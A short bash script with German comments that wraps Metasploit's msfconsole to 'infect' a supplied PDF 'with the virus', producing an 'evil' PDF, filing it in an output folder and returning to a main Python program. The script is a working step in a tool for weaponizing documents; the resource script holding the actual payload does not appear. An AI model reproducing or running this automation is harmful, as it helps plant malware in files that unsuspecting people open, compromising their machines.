#!/bin/bash
datei=$1 # speichert übergebenes Argument in "datei"

# definiert Farben für Ausgabe
RED='\033[0;31m'
NC='\033[0m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'

# startet Resource Script mit dem Pfad mit zu infizieren PDF
DSTIP="futures/$datei" msfconsole -r "msf/convert.rc"
echo -e "${GREEN}Success:${NC} infected ${BLUE}$datei${NC} with the virus" # succes Meldung
mv /Users/emilbonisch/.msf4/local/evil.pdf evils/evil-$datei # kopiert umgewandelte PDF ins Zugriffsverzeichnis des Tools
echo -e "${GREEN}Success:${NC} $datei saved in evils/evil-${BLUE}$datei${NC}" # success Meldung
mv futures/$datei dones/$datei # bewegt PDF in Ordner "dones", macht Tool bereit nächste PDF umzuwandeln
echo -e "${GREEN}Success:${NC} moved ${BLUE}$datei${NC} to dones/${BLUE}$datei${NC}" # successmeldung

python3 "main.py" # führt Hauptprogramm weiter
